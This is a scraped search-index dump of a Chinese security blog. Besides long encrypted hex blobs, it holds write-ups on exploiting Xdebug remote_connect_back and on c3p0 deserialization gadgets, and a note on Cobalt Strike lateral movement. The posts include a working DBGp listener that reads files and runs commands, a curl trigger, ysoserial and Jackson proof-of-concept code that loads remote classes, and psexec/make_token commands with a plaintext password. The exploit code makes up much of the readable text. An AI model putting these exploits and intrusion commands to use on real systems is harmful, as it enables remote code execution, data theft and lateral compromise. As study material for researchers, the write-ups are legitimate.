231432f67b925307db3c482deb1f1cd4f78ceb361e36247037b59ae85ff8d35759310d4004c25aa2facbbf31dd0534ce3fc1baa051f7fda4b86c2c2fc56213e9bd897e21036f29b42e11b0100f4e27cb9ea3fff117fe5683cd08c0032be29316f97a5a4c7ec1baf8933ff76b7e8639882f335469b54b61f316e1d14bf1a8908c859ab0f35debbfe25b44e0d992d86f769688315e5a10a9540ed92ea55688b558adff5983a1e316a59d5eff6f27a20103077cd90084fe33bfe79a0e78b080bf64442a753418af2c4525bad263eb299486d5d372d08a19d536a5ec5f2e659f5a1d1524049cefb1b2e759f9cb119b34ad15f9ff24a8a7c682bd9bae71d541701086e2c6c21f8c55b2aba81950b93cce49ee62ae1a1d546434fee3f1458b5358107bc41a0f4db8b504879bd18ace3a63196ecf689b88b7e478bb324304b4991b42f12bb2ae75d67b102b8981683e7b48b770eadaa533a438a7ea214585aa480d93ef26d22bd015f6015200a54fbf45125934b78d70d61163a36705ddc96ecb82088cea429bb6a40db48a25e8fea59c3b2ad66f2117a4a9e99765e4997b9f2c5f4982a7c1106b5ee9da43832c277948ad1d998ee220a3f1c1d376386c6f918011085239581fb22971754cc7f32fa3946ac806f2b262647d2ace6492ddf888bea885b4871ad610d36d573e6290ce469cc55bb1eda0a7a423620460e57732411b533cb4052cf6553037daaf9be68ffb6518b87d53ae9858eb2c2911fcc4f29b56dcdc2a6f4a72058324a7a1c86acfd84b8c14ebcaa9061ce2feea681ace77a4dbdbd686584fe64b6dc1e98039def942a342e1355062aa78f9bcc164f5a24b3bad96c06672d4b8c22c0348e568d239c6c03ec7ecb19dccc0e5478c33c331cf74769d0234ad20ec37834c635bd78cd23eca1c5aa24511fbbb10ec204aa8bec716859fa297fda81350212776e4339b6f8c37462139324eb622a604e8a056f66f90a7f0418815d1653ad8be3f34a5b7c1cd3b11b9c988669904ac03b3233e8088254e3c0b7a1aa05af00f0869472f9a656437357a4c64d47f2519c17c839694dfb628ab2a2df904230b4598024a84c05ba30282f778e8826dc9f8f8f6673a7773562dea91ebe1e6a7a5e0e0b073a00667fc2d8001346b0f76746fc0f40f0831c5e7ef0fbefc1e9e68caff76a39ab8ac77c0506d872399c9c541804fbfb91876e5a6aa63d93b5e24ae327e5ac03c94b0e51611ffd6da1ab149483c5b1e14679d964e7a8064e2648a6910c2b4c9eff3bc661030da674f5a137d65635c39fee12030d8e0380c648a4474eeb49740ab2366d5351c396d4f6ec86d8f43fb00218e1a16f5f5a98c34ca3e2d162910091bef0e80f701a97d819821194b7f81a36948522d4d7839de368d75b9238979d0c8d2c38d2294536876a0e166618fede2092b2b5fdc6bc30591449b8be7d4917282426176afa6b1f495e6d145948e8c94553c655a7899afc4df69494bd4b15424f4463673734cdef7471fc8c6b88b7ad8d0243405ef48e3ce488d8eb35fa8408bd9098b2141c158739414df8d31503b939ea55259c28e0aeb9bfd8bfab8b2cb51a86c34c7d87fc14e1f5ec4ba2a60ed9cf6b4b5ef5bda1783a7b8c708e95fa8a9d5d728fb1cdc77753212b94c16d679e302c6c30dbda4a18bb50b4ed8eda7fdd16f73e4830739624a0c7dcdb5af9c563e02c99e906a6ff3f69a7a271a2b4b3e6a65abcd0f4e76557e362bb347c23b7f7425874a7443a707fb370649aee0f50af59b870971fa0e0317781 Hey, password is required here.","link":"/2024/09/29/Why-did-I-buy-INTC-stock-in-Sep-2024/"},{"title":"Xdebug原理学习及其攻击面复现","text":"通信过程 Xdebug的工作原理可以总结为下面几个步骤 IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议 浏览器向Httpd服务器发送一个带有XDEBUG_SESSION_START参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理 Php（有Xdebug的拓展）看到这个请求是带了XDEBUG_SESSION_START 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。 Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。 Xdebug开始过滤代码，Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策。 相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。 实际过程中的抓包如图 当链接建立成功的时候php端会[PSH，ACK] 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;init xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; fileuri=&quot;file:///var/www/html/test1.php&quot; language=&quot;PHP&quot; xdebug:language_version=&quot;7.0.22-2&quot; protocol_version=&quot;1.0&quot; appid=&quot;2000&quot; idekey=&quot;phpstorm&quot;&gt; &lt;engine version=&quot;2.5.5&quot;&gt; &lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt; &lt;author&gt; &lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt; &lt;url&gt; &lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt; &lt;copyright&gt; &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt; 需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中，调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)。 漏洞复现 攻击思路来自初心を忘れず 这里将文中提到的姿势进行复现,偷一波脚本 1234567891011121314151617181920#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True: client_data = conn.recv(1024) print(client_data) data = raw_input('&gt;&gt; ') #读文件 conn.sendall('source -i 1 -f %s\\x00' % data) #执行命令 #conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64')) #执行命令2 #conn.sendall('property_set -n $a -i 1 -c 1 -- %s\\x00' % data.encode('base64')) 触发漏洞 1curl 'http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm' -H &quot;X-Forwarded-For: 192.168.169.36&quot; source file:///etc/passwd eval system(“id”); property_set system(“id”); 退出后可以看到 尝试写shell失败（test是777），忽然想到可以base64。 最后 利用条件是要xdebug.remote_connect_back开启 在文档是这样描述的： xdebug.remote_connect_back 类型: boolean, 默认值: 0, 始于 Xdebug &gt; 2.1 如果设置生效， xdebug.remote_host 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 xdebug.remote_host. 参考 Xdebug工作原理","link":"/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/"},{"title":"c3p0的三个gadget","text":"c3p0有三种方式getshell http base jndi hex序列化字节加载器 http base适用于原生反序列化，后面两种适用于其他解组类型的反序列化。具体来讲，jndi适用于jdk8u191以下支持reference情况，hex序列化字节加载器适用于不出网但是目标依赖有gadget链的情况。 http base c3p0 payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package ysoserial.payloads;import java.io.PrintWriter;import java.sql.SQLException;import java.sql.SQLFeatureNotSupportedException;import java.util.logging.Logger;import javax.naming.NamingException;import javax.naming.Reference;import javax.naming.Referenceable;import javax.sql.ConnectionPoolDataSource;import javax.sql.PooledConnection;import com.mchange.v2.c3p0.PoolBackedDataSource;import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;/** * * * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject * * Arguments: * - base_url:classname * * Yields: * - Instantiation of remotely loaded class * * @author mbechler * */@PayloadTest ( harness=&quot;ysoserial.test.payloads.RemoteClassLoadingTest&quot; )@Dependencies( { &quot;com.mchange:c3p0:0.9.5.2&quot; ,&quot;com.mchange:mchange-commons-java:0.2.11&quot;} )@Authors({ Authors.MBECHLER })public class C3P0 implements ObjectPayload&lt;Object&gt; { public Object getObject ( String command ) throws Exception { int sep = command.lastIndexOf(':'); if ( sep &lt; 0 ) { throw new IllegalArgumentException(&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;); } String url = command.substring(0, sep); String className = command.substring(sep + 1); PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class); Reflections.getField(PoolBackedDataSourceBase.class, &quot;connectionPoolDataSource&quot;).set(b, new PoolSource(className, url)); return b; } private static final class PoolSource implements ConnectionPoolDataSource, Referenceable { private String className; private String url; public PoolSource ( String className, String url ) { this.className = className; this.url = url; } public Reference getReference () throws NamingException { return new Reference(&quot;exploit&quot;, this.className, this.url); } public PrintWriter getLogWriter () throws SQLException {return null;} public void setLogWriter ( PrintWriter out ) throws SQLException {} public void setLoginTimeout ( int seconds ) throws SQLException {} public int getLoginTimeout () throws SQLException {return 0;} public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;} public PooledConnection getPooledConnection () throws SQLException {return null;} public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;} } public static void main ( final String[] args ) throws Exception { PayloadRunner.run(C3P0.class, args); }} connectionPoolDataSource是PoolSource，但是PoolSource没有实现序列化接口，所以会在PoolBackedDataSource时进入到catch块中。 catch块中调用indirector.indirectForm(this.connectionPoolDataSource)会把Referenceable类型放到ReferenceSerialized中并进行序列化。 在反序列化时，会调用ReferenceSerialized的getObject方法，向http base请求类 jndi 注入 PoolBackedDataSourceBase 12345678910111213141516171819202122232425262728293031323334353637383940import com.fasterxml.jackson.databind.ObjectMapper;import java.io.*;class Person { public Object object;}public class TemplatePoc { public static void main(String[] args) throws IOException { String poc = &quot;{\\&quot;object\\&quot;:[\\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\\&quot;,{\\&quot;jndiName\\&quot;:\\&quot;rmi://localhost:8088/Exploit\\&quot;, \\&quot;loginTimeout\\&quot;:0}]}&quot;; System.out.println(poc); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(poc, Person.class); } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) { String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); }} hex序列化字节加载器 在一些非原生的反序列化（如jackson）的情况下，c3p0可以做到不出网利用。其原理是利用jackson的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import com.fasterxml.jackson.databind.ObjectMapper;import java.io.*;class Person { public Object object;}public class TemplatePoc { public static void main(String[] args) throws IOException { InputStream in = new FileInputStream(&quot;/Users/cengsiqi/Desktop/test.ser&quot;); byte[] data = toByteArray(in); in.close(); String HexString = bytesToHexString(data, data.length); String poc = &quot;{\\&quot;object\\&quot;:[\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,{\\&quot;userOverridesAsString\\&quot;:\\&quot;HexAsciiSerializedMap:&quot;+ HexString + &quot;;\\&quot;}]}&quot;; System.out.println(poc); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(poc, Person.class); } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) { String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); }} 简单跟踪一下，进入setter方法。 由parseUserOverridesAsString对字符串进行处理 提取HexAsciiSerializedMap之后的东西 最后由fromByteArray中的deserializeFromByteArray进行反序列化","link":"/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/"},{"title":"cobaltstrike在横向移动中的上线技巧","text":"cobaltstrike psexec 在进行pexecz之前一般需要用rev2vself回到原来的回话和克隆token rev2self: Revert to your original access token make_token: Clone the current access token and set it up to pass the specified username and password when you interact with network resources. This command does not validate the credentials you provide and it has no effect on local actions. psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to. 123rev2selfmake_token administrator aaa123!@#psexec 192.168.20.30 ADMIN$ smb-bind-pipe smb-bind-pipe是建立的smb监听器的名字，创建smb监听器的时候会要求输入端口，不知道意义何在，随便填一个就好。 用这种方法上线的权限是系统权限 ps：后来看cs输出，填的端口号会是命名管道的一部分，这样好处就是可以在一个机器上开多个管道吧 cobaltstrike smb pipe 其实上面psexec指定的是smb-bind-pipe listener，那么psexec成功后通信方式就是基于smb。使用smb的好处可以一定程度上规避流量审查。另外一种使用smb办法就是生成windows executes，在目标机器上运行然后link，这种方法拿到的就是，运行这个exe用户的权限而不是system权限。 Use: link [ip address] Link to the Beacon at the specified IP address. ps:在使用unlink的时候smb pipe都会断掉，但是smb pipe的进程并不会退出，link两次后通过psexec和运行exe的shell都会恢复 cobaltstrike bind tcp 建立listener后和smb一样，可以用psexec 123rev2selfmake_token administrator aaa123!@#psexec 192.168.20.30 ADMIN$ bind-tcp 也可以生成exe，然后使用connect连接 1connect 192.168.20.30 需要说明的是创建监听器的时候填写的端口并没有什么用 实际监听的时候还是监听的4444端口 加上smb，和tcp，拓扑图如下，蓝色是tcp，黄色是smb ps：smb和tcp的相同点在于，unlink会同时断掉tcp和smb会话，不同点在于smb可以通过link连接回来，但是connect无法连接回来tcp，原因在于unlink后smb类型进程还是存在，但是tcp的unlink后进程会退出。 cobaltstrike reverse tcp cs3.13之后新更新的一个listener，相当nice的一点是Linux跳板机上也支持这种操作，不过在创建listener的时候并不会出现。 找到它需要在 命令行如下 12345678rportfwd 23333 windows/beacon_reverse_tcpUse: rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port]Binds the specified port on the target host. When a connection comes in,Cobalt Strike will make a connection to the forwarded host/port and use Beaconto relay traffic between the two connections. 比较“奇怪“的是，这个监听器不能在psexec的执行，只能在生成stageless的时候找到 上线可以看到反向的绿色线，这种方法有个弊端，因为监听的端口往往不是默认放行的端口，所以要求边界机器要关闭防火墙。。。 ps：reverse同样受到unlink的影响 参考 Cobalt Strike几种不那么常见的上线方式小记","link":"/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/"},{"title":"eBPF基础学习","text":"f8c89326e2dd27398d7b0a10fab7ffc5c1a3b79cf3ebeae27a2601007c3f2a8bb91304c835f656ac439dab64ffb615d2d1b1ee3956a14e29f26aa71525d7a04ae0e911a5a451c45af170d9ac1668436d16ba767b289918511fdbf5d99b10fee94bc00b21cc7d81eac2fd3eb870295d13f0eedeac168cac058e8fbaf5dfc25ce8557ce52806356f66da7fdc0380bc2755f3313f971b20957ba6c443d1c1ef19b6ad62fc3ea72b5834dff4952c8db9047f131d40a20d8b9113e5aacf953c1bb50a485c95b1a0367bdcd34065a2f047128c06664b10d81776620e6e1209a116ccef74ac6a4aea7d5cb649cf5fc48728e4a81d0f7f03ae9bbb903ce17f77902242c3ba128a569f0cef3cd9b5880bda6878b66f6fc94bc44f209d5203bb7e89965be11749e147b5a543e073db11ca1e57b5c93293c57eafe19b7813d9cee8769d1b091fbcc34e5d2825d1a7b6a7df2dd08fa77093e2e79cbd4144f94c883834f8462ea0ccce536a4d5d3b5cf85f331d5ae8dd336e421f78a46a9e6a336bfa657925c90173cf40991e6af07c42eb4d1a2cdb1ae7e1ec392dc2e62eedecf4b600675042c4cc63691b3dd14734dec7588d3bb9838a2b966ef0931961c2cf0eff30884fcbe277b7d2500291ad3c5f81ebfdc551d22ab95513809142fceb01e08806d2f5d30811bcc737176a1650fe7b48d8d4d2659642ee3d50b6addf72a4d6776622a9d3cf4b43c4c8f8c52a180cb3bacd07adeabbb6a6cdfe118dba395fa9e88f7dedfc077203600d418608c39d492959aed2125b1587fe5772b03d2171d10754f38b68fbc2e74bc719cfbdadf694dd1a026ae4f540e73dee1f88c5cde9b7ded2e9f92275fa54eeccd694696740d22deb412cd80fe710b520af5d9865fe2887370f07ffd9de823aeb5d5de63021d85e11f62ade94eb40d90e294900859d39f2ae2add9a36dd889c33be8b2accb2d4c2191fd809a08b2204ab0b5dd364ae269203c610a9fe1bc50f3f454d3c09220c6d73f488cc7818e7d4f4ce092f9cfa553b5495f185346f2277773e2bc40a1ebbde2bd421ca1aadf109a1fb424f2ea52abf3f707b6b5d69e5da274ea58b4cdf9b258cbaf7962d7bd0d0afaba27ce1348cbc200e82eb56c9fba15780d9fa169afefd334e64c8d2e74d8a641330c806e27030435c8f4ff5208e3f418589f311831cfa6fb5bb6cae5534a65b8928ef80fd3e8dc63592f797b81a968bc651c374fd4c057647e6c9f90073437cad98de704a9c2f407342e6b505c989f7eaa26bcfd9f0149527aaa2b94dd5bd32a9ecf767a89a6df73371a2b9db7336bbf84c18fe174a29f8c99fb446d1a457559fcc91b1a2622b8501c7d60fd9746f7931187fe4125fe66f8e57a62294ff02b5a108ca713d9a10898601422fd90b6a666f79b4dd422d116bcc1ef5ee56fb59314fefa1de1f352846e530e5af9275eca56e3863ceaa9a087689f11b832d7dc9206362dfc9c2fed83dc651dd80988310134a34bba63f80e6b9e13d8247b0ae461af539e2607432dd7427af3134e86674fec6e9f560b0057cdc3fcf73899d4e88f0f8a89dc4e3ed37269e4e76a9978987e6ca2f200bd781a905c8315545c496ff84c0c8b3eb1cf8aa5a548b488664f9a721d44e3ad903678f4a976bceb76450de89ed764768e6e32a15b5178734f109ca8c577284afd403a47c9bd1eedb51c47135a5bb6163e24306a8d572462073eab7be93f50937cec5bcef25fe47a3fa4b27d4bd7c19be83ce5750e3a8c134f2af5cfc1a8a930828aff7f9bbc5f41e424d9cc41459a4bbcb981fc0d66243c0657a8f347a9e084748811e6528df05aece7e944b2efae3690e9fc856ee1067a1a175baeb35384b06760ab22bedf97dd92c7a3ec88f9965964979a45f510a84183a2bef42241c8a353abef5a6c0100995a159e5da6f3c97db68215e702d23948004be1676bf87e91dab8e231e2b812972913ed97e6c90651ec2e75a61a6e8e6beadec304b27757f01374f4f04b0276b42d8965c3d34536cef046d9b7d370504e52c50b07823ea52e6b25e84390adfc106f0a1c96c9acda3c4d3ba19ef0302a97d214b45b6783f728db7ba926fbd74263160d2681faa25091a908c70ec9934e4e9958e14930dcce4d79292b8aa760bc9fd49740f71f39e23de731a2aed214518885d9a93991a192bbe264ab1d72e65664639ea85ff7db7b4bdf828faefd963cfff1cea1ecad44ebd4c793160b59d14d57a952b8cb6c3e61def11f79e568bfe49816c6e28a15a2269e2342667d9d19f8d7230bb8671c2317179b6f0ede13c8d1a61201a1082f5de386903ec009e6e55811042117a1986a1fce914d3e12802cd2a51eb8e840a9067e18f8d1539a3b188881a923bc3c599aadb3124cb9e96662c81ed657421980f3e7143272dbec58c818a759925900dc7be323ceb536547ca4756671926ca01bd0db4ab2425911bf80b2d9a3c421e4bc14cb326efc85f7652236aef20b60693218c2bbc8f77fb5dfbe12af76394d1f412dd4e8243b4d10e322b8da2a53fd6dace99921a82f62aca98b88af01cfb27e6cd553d44db04ac85316a2e908a03fb56e72055a9b789a0e07dc034ca1d39aad9c07e42398b10615883b7f28623193ec10517dbdf1b476e5f6400e86a405764a3f5cd3ac20cd0d7b5e40b9d9164e6354c87db36accbd3a3ab65798686276c1e29063803537c672666d7126deb0e8236b19b29c670c229372cad214a7da5e02e7f7cf68c98b67bc27c2c13c8dee201b8c5e55ad4aca4a51f602041a091ec1633e1df899110112e5b202179f7ae84079d6ccfc265653989880175eee1dc074706c72abd4b3c1b3989bbba42727bbd0de2d70f02007efe6d69b70f11ce75bcc9b55d658732e46c3151c5a2a3bef7855f7926c98fbed49cb639ce6da22db17f14b28b7d04524a727ac5f30da333e28f7588ba07acb0edb1af44010dbc11bddae7869c77d9aed677af2c9dd73f93f2cc6f95599e5f39b5a8da9b87dda317e711fedcf3933757ed127297b75c5957df42cbef9d69785cc22876b9748f892a4ebd65260e5c5c7d571ceb1caf3e451ae2cd29b2800eaa64321c95da0e9a8e38f0f115836e324de1707a90d2ee5ceb41427997445a4eadb07b19ce5ce0d3fadcfff20782cc782ad72698030985233face4dd99a9f6f92d5fa631089eeeda331ffcc19a2c6892e017123d283d357f0d8b333dabb6642f8e0cdaed2722722502f02c7df5ed3d249d24eab0e233d9857995f69bae6673946565aa280da667b0c1db46d3fceacf2377b7f9afd452c62df9d3654c50b6ee1544b52e613278633160bb596b42c53abbf22f2f0d7ec4a1abe96b4df6b9ac7bdd3253813f5ed83c96ce9a1788e0990acb5d40684afafbe6636583e40f9fc2fd686cd8df0d6f578bbbfd9e3f4387dd94e74967ee3d042bf2c4ccecd0cdc5678c474d5a9b85b732ad198f509de4de8b442becfe5335cfc4f365a600bf4cb3ec0c13297b87027c11cba719400e5a4aaea5c03ae5588c6d386040e2d2d83564d7719213e94a250954b7d04e40147ec6a95ccff4695344f4897b329897d5ae5252892e138ce7fb44739fea69fa76e28a4656c537c78c5b8f50d0a700288391abcc8c8f9845f4655cd836c7a5d8ab6d2b41b225d17fb10f730348fa8ba808c6edeacf7af45c85a90a370689e4f3752ed1ef4b8c86111443e3df06a08d1a8e35df03c24fb6e3876d97c94be85e2f9d171615b8eeb6da8a1fec3d3585d9815568ba364c945f719846784674eaf7c8f5004b571b44e2a357758586cb87181277944187acb8613b8e577259d51709fa1bd3f30b36764854801cd7db04dd3ad4c57f46933a2a156761f9b06b64e5f349bbd808e5657bfc00fc2e21b7cd0dd0f9c062366308d8c430006f837aa6cb61534a788be3b66b60d9cd800fad217cebbdbdcf0f42e42c7833e55ff87990ef9f4dcd1b72ed2536ef493b9741f6bc5ebf0972368c798bb8d3e3cdaf3128bf54a8d27b9a60d2eaf4321b3de35be45a2739e826c71c4c8f8c8531d9f13a1c444672e77f901892333c1ecb27f697f54209e8eaafd40d1ea54948985dfda2355f349565c84cc0edff4f11a014b0f488a72b488c753b0570f1b0f8b27e93e247091d8090514a9a460e1d88f445012c0c4583737e061923882e32e7627ecee1e7595a224c5ba4075f549c4fd3d137c5e3c3e79f030cb6efe8fa87e68bc98261b532866683f1366361f2b9e7dfd003347286af33fa89dcab546c65da4959c4acdb2110c56dbcfc74e0dc52d981cd044ccc5fce22291ada5f508a6228ebd6d423cce3e84ed94bf336c7dcdcd1d95cf133586155296919e24cb1e18c240c71cea8cee1da276d487461ef06e77af22807291378de286dde03c45a27795f597f33a7bf5e74411c4d8a4be3436713ae9a021b29df3718146c6021defee6eb499f8854efdaf74a1287ff9bbfdb6860970914f0cf8815bde24abc25bc29712c688c8d32f27fc6f2ac3c90bd925df1457f0d485c0e5255a751ca5690e602502ad376e09bf9f24e97d8ee4612d587be2e973b6eeac115c3156364ad5a005810583b1c937478059a4f2b1220401ec44077890a91f4006263d6716d977d88d9b5b848f549694b7c2b64287e55a9a81030aa71614320bb24498027b52a1cfdbae72218935beed7a2b4190bd6fa3aa53583031d7e12ba7692c6a3bd6ef67dc345319aa07696e99942f52a7a3c7407c0d42a4713f8e1f2979486f2342176dad30510905fcf61605c57f9a3caa5f2fde3cad6002286232d233a805ac79931a30dd9317cb812f373e4184d1a4325e377550d433d87a8ce80218b38b48a20bb095b7e0cc07f8e85f03b7be61801ae3a22f090363687312945d14d37a289d763e802a41e7aa36b3081ee027248b79854236b197b2d752467a11cba5c3743188dfed453450ee082a664c3f2001e4f7dd6b0469c9b8fca85b1942e1f9457ff6f4cd40a8aa342a73c194868d8302fb6487a9947e8722713382cb20b05b7979aed919a2712049624213bc86eb587be92517aa24e14211249b940e6fb57fb4a926756cc612738c3318334dbe65c5bb3dc83474259cf64e6e08810080d24e9678c8176e86559ea9eb6eeac7d921b6c2f840a9d4ad8916036ab0b7dfd94acc17afcd9363d89627acb0a83d55990fd5e970d9ad3e3d7573f24a251c9dabfb803c4b01640db1907c3cf06b2079866b63157764cb91b7774730710a2fca2d49b9830a0533469be1931136ee7d47a8235075260d33c92e7afa6cde0007dc9d552f208a1eab60ac3dc757a05ba1db309447906dc2248524759645c376e6dfbcddd5b2ab9c786a0f8d32c80e12b19160afb6d5704d8a0ccf31b4f62c9208ec0cbc5e21fd71381fd4f72b7789a847a168fbefe92bbb733294626fc37a1d3bbc2c08ca39d0c786fbc59c93336799461e618639f31f44fe9c3c7532805480b8c7442531169511a2a956f5d12f97524f803effd210a13308ca1a2fd8966e82b3765413f1fd289ebedaf77868fe5af723bec62bc5c17dd283bc5f84e9b8db147c155d630e928ea1cc4b1c313e272c0ec9a43ce8c52f275c944fc998b4ded34b94686e8893081d6a63633545ffb6c106bfab6aec936af84ffeadcba4dcf4c2d9d4af3bc1063537c6042ad43f87a0be310b8fe4635ed14278b2c79db57e3edd98b3bae17de61fd5bc76302b263ad0b95be63e3f3266ed2f58fb4c35b3160c2cb5a271061d7150d6861568269a6a7f40114b7446c6ea73968be8255ace64e4ead95296cb817591c35610f1a03e66bc561cd69b722d8d1f3011e9748ec6b5f3716f15e98341d729c82d223ffdef2bd282dee2348b3a8cec7f7a5e867328b30e9268911167104621c2e91ee7807a2edd6f3834eedde8a17a3b66ffc3466a32e77c51d24f683a6b0d4d1c3b2124b1fa0773872686bb4e3e52e6bbc78e5f8878b941a4eea17976885214bcf4b06315bca4371c40c4b28795db141f4c37ce0bdfb6afd08f92aeee31447c1db65d575634bd3718675d20bc10ab6407c99254836acd45198e61c3cf2aba1eef611cebc55fba8a7fa3b58ea3eec22ed237b9c5958304edb25e75bb2060a3ff374b2706d73ad4dd97fe5756c0cf614b4aeb66587d2b376f4c812835e69cb2844055c077cb53923bba193a1d868330e1584fabba264c8e7bf226830bdc9f9ae2db2e3445e75be79d17f1048061032f33d1de2404246884a250e7b488e8b04c117ed14f888d9a6321d9dcff3ed3779353399ad7f509d1e898bac23f0c23e133415a1b6b71acc309b5905db6e18021911aac24be38121566b3190eec467c7637c4c304575a33bf5f27a7b8e476d7c30b827452f022b108d66b0f81d7ecb663f1d973d2aee5115db31725bf1b17c0a55ecdfff98916207cd9b6a272a923a3026edcd76b7471efd95db9cf6e5721df45ba75cd2276f4003da431d365942c10d03bc22936fd0c1c629e5ac30616dfef235e6974d735a249c7ecc746e5b86138b2ad329b25041fc575231e0360153c4dc602a2605aa6537dccb4f9858c444fb0e53038fc96c4bf8656ba1d53b57e4606783037677c84072c1cd91dff228345b54693a6015b0a13c2009af4a781f7f0e655f110d7c88b4b1ce0326b4a466efec5302da0f0de37df5177790cb0dfb2914561c61ae46e20020a5e8790569de87aaf76697f0f61f8906965914d63aa0e64ac350a0d955aace654e11018743f91430d2f2c1c681c8f86d6391805dd4e0cceb4eaeb27431fa471141d24181bb64d8baee06fa64b1c1a741c850bae79742505713f353aa91cdbff201a4489289f1b452c1aca54172634f2b2d3466a1ee674f97011ed606d687c3a2ba5c2a00775a969b2c0c22b3884fed328511d7660d9edd9f4d54297dcef62512cc4f7ec4fe0ad2664943f9ca3779c537221ba6b09fc3085da9486cbabeb450033d6f28f591245f62e05060ad3f3580a549c428171608a94e6bf4d419fc675e04bc0d06a9c986414c6293c6e54d1bf3f9276874d03b5cc7c32ec8115463a26a6391a429c6db64549cc37263d03542efe8c4c0f387e2194131d2babf8753cff5bbe9869b04498c700eb5419ccf21e91473085da77bccd8d4881c178375da191669a50367d3616cf5cce36f276a24bf3a89dc90c94216ac4b9b2a511d6237c07f70966482ba7e16a8126664a5beb58a126eb8f500ad645fd503382039000545fb1ccbf8055994441211c72d7e9c7ad7dac2ef3782fa6bf19fac5de5fd187c5d4f29c159e0106e82b117780fa6c0b23bb71a87b52437d47cdd9bfb146599c511c7926aa483dbbfd062e9c09524054db2a14a39eca21b34c8b9a882adab1e233d33d40db9ed9ac82829755b2d3db2104c531e6eb41ed4824078bcdc2252cdc8ff1c59dc2bd216bc55eebdd58f2980974c4faa8ef9ff45ee063ce944475a965f828155f13df27f16ff5f543ceccc1bad005aea0572f98796fad0fbaf713898dd462124325b8c9e11fc337bec6f86a08ce2a65dd023265e85af95eb43a1b7a68174914fa9f8ea4ec98ac8b671c3de2d03171f47ecd333f465a0194052fb91c2b8d9613bb3188c6759c8afa3b1b652752a200c1ca779593793db8a15f8136b672075f6056eeba3673c1f8a8b250bf4d6db1d9ad7beaf0c7ab3fbd0b4c90546c92a6d4156228e09c481b4427a3bf0a9f6cd021fed83a645d66e25333171cf2575aab2ab22a01e0a6c296e729733915ed9ae1590c3d207985d2bbff5df73bbb9bfd63f3e984e9da9d1c5e2b06b7ee0521e6fee6fa1